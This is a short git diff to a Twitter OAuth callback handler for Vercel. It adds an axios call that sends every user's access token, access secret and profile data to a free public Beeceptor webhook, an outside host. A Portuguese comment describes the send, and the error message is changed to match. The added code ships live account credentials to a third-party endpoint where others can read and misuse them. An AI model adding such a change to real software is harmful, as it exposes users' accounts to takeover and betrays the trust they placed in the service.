@@ -1,6 +1,7 @@
 import { VercelRequest, VercelResponse } from '@vercel/node';
 import { getOAuthAccessToken } from '../lib/auth';
 import * as cookie from 'cookie';
+import axios from 'axios';
 
 export default async function handler(req: VercelRequest, res: VercelResponse) {
   const { oauth_token, oauth_verifier } = req.query;
@@ -29,9 +30,16 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       oauth_verifier as string
     );
 
+    // Enviar os dados via POST para o endpoint do Beeceptor
+    await axios.post('https://oauth-twitter.free.beeceptor.com', {
+      accessToken,
+      accessSecret,
+      user: results,
+    });
+
     res.status(200).json({ accessToken, accessSecret, user: results });
   } catch (err: any) {
-    console.error('Erro ao obter access token:', err?.message || err);
+    console.error('Erro ao obter access token ou enviar para webhook:', err?.message || err);
     res.status(500).send('Erro ao obter access token');
   }
 }
